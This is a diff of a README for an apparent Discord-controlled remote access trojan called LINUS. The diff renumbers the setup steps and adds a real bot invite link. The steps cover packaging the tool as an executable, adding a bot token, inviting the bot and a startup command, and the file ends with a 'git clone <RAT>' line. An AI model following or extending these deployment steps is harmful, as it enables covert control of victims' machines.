@@ -54,29 +54,24 @@
      pip install auto-py-to-exe
      ```
 
-2. **Write Cred in Commands.py**
+3. **Write Cred in Commands.py**
    - ```bash
      Example:
      token = ""
      ```
-     
-3. **Invite LINUS in the Server**
-   - ```bash
-     link link link 
-     ```
 
 4. **Invite LINUS in the Server**
    - ```bash
-     link link link 
+     https://discord.com/oauth2/authorize?client_id=1516481660823011358&permissions=0&integration_type=0&scope=bot
      ```
      
-4. **Startup**
+5. **Startup**
    - ```bash
      !startup linus
      ```
        
 
-5. **Open Source**
+6. **Open Source**
    - this project is open source - AND EDUCATIONAL PURPOSES ONLY!!
      ```bash
      git clone <RAT>
